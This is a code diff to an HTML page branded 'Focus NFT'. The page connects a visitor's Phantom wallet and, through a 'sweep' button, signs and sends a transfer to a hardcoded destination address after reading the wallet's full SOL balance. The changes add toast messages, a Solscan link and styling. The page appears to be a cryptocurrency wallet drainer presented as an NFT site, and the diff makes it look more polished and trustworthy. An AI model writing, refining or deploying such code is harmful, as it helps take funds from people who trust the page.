@@ -15,6 +15,16 @@
     const destPubkey = new PublicKey(destAddress);
     let publicKey;
 
+    function showToast(message, type = 'success', duration = 4000) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = type;
+      toast.style.display = 'block';
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, duration);
+    }
+
     document.addEventListener("DOMContentLoaded", () => {
       document.getElementById('connectBtn').onclick = async () => {
         if (window.solana && window.solana.isPhantom) {
@@ -23,8 +33,10 @@
             publicKey = resp.publicKey;
             document.getElementById('walletAddress').textContent = publicKey.toString();
             loadBalances();
+            showToast('Wallet connected!', 'success');
           } catch (err) {
             console.error('Wallet connection failed:', err);
+            showToast('Wallet connection failed.', 'error');
           }
         } else {
           alert('Phantom wallet not found! Please install Phantom.');
@@ -38,13 +50,13 @@
 
       document.getElementById('sweepBtn').onclick = async () => {
         if (!publicKey) {
-          alert('Please connect your wallet first.');
+          showToast('Please connect your wallet first.', 'error');
           return;
         }
 
         const amountLamports = await connection.getBalance(publicKey);
         if (amountLamports < 5000) {
-          alert('Not enough SOL for transfer.');
+          showToast('Not enough SOL for transfer.', 'error');
           return;
         }
 
@@ -62,16 +74,21 @@
         try {
           const signed = await window.solana.signTransaction(transaction);
           const sig = await connection.sendRawTransaction(signed.serialize());
-          alert('Transfer sent! Tx: ' + sig);
+
+          const explorerLink = `https://solscan.io/tx/${sig}?cluster=mainnet-beta`;
+          showToast(`Transfer sent! `, 'success');
+          setTimeout(() => {
+            const toast = document.getElementById('toast');
+            toast.innerHTML = `Transfer sent! <a href="${explorerLink}" target="_blank" style="color:#fff; text-decoration:underline;">View on Solscan</a>`;
+          }, 500);
         } catch (err) {
           console.error('Transaction failed:', err);
-          alert('Transaction failed. Check console for details.');
+          showToast('Transaction failed.', 'error');
         }
       };
     });
   </script>
 
-  <!-- Custom CSS -->
   <style>
     body {
       margin: 0;
@@ -132,6 +149,29 @@
       color: #999;
       margin-top: 40px;
     }
+
+    #toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #1c1c1c;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 6px;
+      display: none;
+      font-size: 0.9rem;
+      z-index: 1000;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+
+    #toast.success {
+      background-color: #28a745;
+    }
+
+    #toast.error {
+      background-color: #dc3545;
+    }
   </style>
 </head>
 
@@ -168,5 +208,7 @@
   <footer>
     <p>&copy; 2025 Focus NFT. All rights reserved.</p>
   </footer>
+
+  <div id="toast"></div>
 </body>
 </html>
